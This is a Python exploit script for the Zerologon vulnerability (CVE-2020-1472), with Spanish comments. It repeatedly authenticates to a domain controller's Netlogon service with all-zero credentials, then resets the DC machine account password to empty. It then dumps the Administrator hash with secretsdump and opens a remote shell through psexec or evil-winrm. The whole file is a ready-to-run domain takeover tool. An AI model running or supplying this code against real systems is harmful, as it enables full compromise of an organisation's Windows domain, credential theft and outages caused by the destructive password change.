#!/usr/bin/env python3
#
# CVE-2020-1472 - Zerologon

from argparse import ArgumentParser
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT, NDRENUM, NDRUNION, NDRPOINTER, NDRUniConformantArray, \
	NDRUniFixedArray, NDRUniConformantVaryingArray
from impacket.dcerpc.v5.dtypes import WSTR, LPWSTR, DWORD, ULONG, USHORT, PGUID, NTSTATUS, NULL, LONG, UCHAR, PRPC_SID, \
	GUID, RPC_UNICODE_STRING, SECURITY_INFORMATION, LPULONG
from termcolor import colored
from impacket.dcerpc.v5.nrpc import *
from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto
from art import tprint
import hmac, hashlib, struct, sys, socket, time, os, re, random, string
from binascii import hexlify, unhexlify
from subprocess import check_call
from struct import pack, unpack
from impacket.smbconnection import SMBConnection

# Numero de intentos para explotar la vulnerabilidad, la probabilidad de que el ataque funcione es de 1/256
MAX_ATTEMPTS = 2000

def fail(msg):
	print(msg, file=sys.stderr)
	print('Error de conexión al DC', file=sys.stderr)
	sys.exit(2)

def try_zero_authenticate(dc_handle, dc_ip, target_computer):
	# Creamos una conexión con el protocolo NetLogon del AD
	binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
	rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
	rpc_con.connect()
	rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

	# Inicializamos variables con el nonce del challenge y la session key (ambas todo 0's)
	plaintext = b'\x00' * 8
	ciphertext = b'\x00' * 8

	# Flag que desactiva la opción de usar RPC seguro cuando bypasseamos la autenticación (sign and seal)
	flags = 0x212fffff

	# Enviamos una petición de Challenge enviando como nonce todo 0's
	nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
	try:
		#Intentamos autenticarnos con una llave de sesión constituida por todo 0's
		server_auth = nrpc.hNetrServerAuthenticate3(rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,target_computer + '\x00', ciphertext, flags)

		# Si hemos recibido un código de estado de 0x00000000 es que hemos logrado bypassear la autenticación, por lo que en el servidor la session key ha salido de todo 0's
		assert server_auth['ErrorCode'] == 0
		return rpc_con

	except nrpc.DCERPCSessionError as ex:
	# Si recibimos este código de error, no hemos conseguido bypassear la autenticación aún, pero seguimos intentándolo.
		if ex.get_error_code() == 0xc0000022:
			return None
		else:
			fail(f'Error desconocido del DC: {ex.get_error_code()}.')
	except BaseException as ex:
		fail(f'Error desconocido: {ex}.')


def perform_attack(dc_handle, dc_ip, target_computer):
	# Bucle para autenticarnos contra el dominio
	tprint("ZeroLogon")
	print("\nhttps://github.com/dirkjanm/CVE-2020-1472 código del exploit en el que nos hemos basado")
	print(colored("\nCódigo mejorado por Imane Kadiri, Denisa Medovarschi e Ismael Esquilichi",'red'))
	print(colored('\nIntentando autenticarnos contra el dominio...\n','magenta'))
	rpc_con = None
	for attempt in range(0, MAX_ATTEMPTS):
		#Llamada a la funcion de autenticación contra el dominio
		rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)

		if rpc_con == None:
			print('\rIntento: %d' % attempt, end='', flush=True)
		else:
			break

	if rpc_con:
		print(colored('\n\nHemos logrado bypassear la autenticación!! (Intento nº = {})'.format(attempt),'magenta'))
	else:
		print('\nAtaque fallido.')
		sys.exit(1)

	return rpc_con


def get_authenticator(cred=b'\x00' * 8):
	authenticator = nrpc.NETLOGON_AUTHENTICATOR()
	authenticator['Credential'] = cred
	authenticator['Timestamp'] = 0
	return authenticator

#Estructuras de la función NetrServerPasswordSet2
class NetrServerPasswordSet2(NDRCALL):
	opnum = 30
	structure = (
		('PrimaryName', PLOGONSRV_HANDLE),
		('AccountName', WSTR),
		('SecureChannelType', NETLOGON_SECURE_CHANNEL_TYPE),
		('ComputerName', WSTR),
		('Authenticator', NETLOGON_AUTHENTICATOR),
		('ClearNewPassword', NL_TRUST_PASSWORD),
	)

class NetrServerPasswordSet2Response(NDRCALL):
	structure = (
		('ReturnAuthenticator', NETLOGON_AUTHENTICATOR),
		('ErrorCode', NTSTATUS),
	)

#Función que se llama después de bypassear la autenticación que cambia la contraseña del usuario local del DC.
def passwordSet2(rpc_con, dc_name, target_account):
	dce = rpc_con

	if dce is None:
		return

	request = NetrServerPasswordSet2()
	request['PrimaryName'] = dc_name + '\x00'
	request['AccountName'] = target_account + '\x00'
	request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
	request['ComputerName'] = dc_name + '\x00'
	request['Authenticator'] = get_authenticator()
	#Como nos piden una contraseña de 516 bytes como máximo, introducimos en el paquete 516 null bytes (00) para dejar la contraseña nula.
	clear = NL_TRUST_PASSWORD()
	clear['Buffer'] = b'\x00' * 516
	clear['Length'] = '\x00' * 4
	request['ClearNewPassword'] = clear

	try:
		print()
		resp = dce.request(request)
		print("Contraseña de la cuenta del DC cambiada. ZeroLogon explotado correctamente.\n")
	except Exception as e:
		raise
	dce.disconnect()

#Shell por psexec
def get_shell_psexec(administrator_hash, dc_ip):
	command = "psexec.py -hashes %s Administrador@%s" % (administrator_hash, dc_ip)
	os.system(command)

#Shell por evil winrm // gem install evil-winrm
def get_shell_evilwinrm(administrator_hash, dc_ip):
	command = "evil-winrm -H %s -u Administrador -i %s" % (administrator_hash.split(':')[1],dc_ip)
	os.system(command)

#Ejecución de secretsdump
def get_secretsdump(com_name,dc_ip):
	command = "secretsdump.py -just-dc -no-pass '%s'@%s" % (com_name , dc_ip)
	os.system(command)
#Buscar y devolver el hash del Administrador usando la libreria Regular Expressions
def get_administrator_hash(dom_name, com_name, dc_ip):
	out_file = "out"
	command = "secretsdump.py -no-pass %s/'%s'@%s -just-dc-user Administrador" % (dom_name, com_name, dc_ip)
	os.system("%s > %s" % (command, out_file))
	out_contents = open(out_file, "r").read()
	administrator_hash = re.findall("Administrador:500:(.+)", out_contents)[0][:-3]
	os.system("rm out")
	return administrator_hash

# Funcion que manda una petición SMB de la que podemos obtener el nombre del dominio y el NetBios name de la máquina (evitamos el uso de nmap)
def get_target_info(dc_ip):
	smb_conn = SMBConnection(dc_ip, dc_ip)
	try:
		smb_conn.login("", "")
		domain_name = smb_conn.getServerDNSDomainName()
		server_name = smb_conn.getServerName()
		return domain_name, server_name
	except:
		domain_name = smb_conn.getServerDNSDomainName()
		server_name = smb_conn.getServerName()
		return domain_name, server_name


def parse_args():
	parser = ArgumentParser(prog=ArgumentParser().prog,prefix_chars="-/",add_help=False,description='CVE-2020-1472 PoC editada por Imane Kadiri, Denisa Medovarschi e Ismael Esquilichi')
	parser.add_argument("dc_ip", help="Dirección IP del DC", type=str)
	parser.add_argument('-h','--help',action='help', help='Muestra este mensaje')
	args = parser.parse_args()
	return args


if __name__ == "__main__":
	os.system("clear")
	args = parse_args()
	dc_ip = args.dc_ip
	dom_name, dc_name = get_target_info(dc_ip)
	com_name = dc_name + "$"
	rpc_con = perform_attack('\\\\' + dc_name, dc_ip, dc_name)
	passwordSet2(rpc_con, dc_name, com_name)
	rpc_con.disconnect()
	print(colored("¿Deseas tener obtener una shell? [y/n]",'cyan'))
	if (input() == 'y'):
		administrator_hash = get_administrator_hash(dom_name, com_name, dc_ip)
		print(colored("¿Quieres explotar WinRM (menos común pero devuelve una mejor shell) o utilizar psexec.py (más fiable)? [1/2]",'cyan'))
		input = input()
		if(input == '1'):
			print(colored("Happy Hacking :)",'red'))
			get_shell_evilwinrm(administrator_hash,dc_ip)
		elif(input == '2'):
			print(colored("Happy Hacking :)",'red'))
			get_shell_psexec(administrator_hash, dc_ip)
		else:
			print(colored("Happy Hacking :)",'red'))
			sys.exit(0)
	else:
		print(colored("¿Deseas ejecutar secretsdump.py? [y/n]",'cyan'))
		input = input()
		if(input == 'y'):
			get_secretsdump(com_name,dc_ip)
			print(colored("Happy Hacking :)",'red'))
			sys.exit(0)
		else:
			print(colored("Happy Hacking :)",'red'))
			sys.exit(0)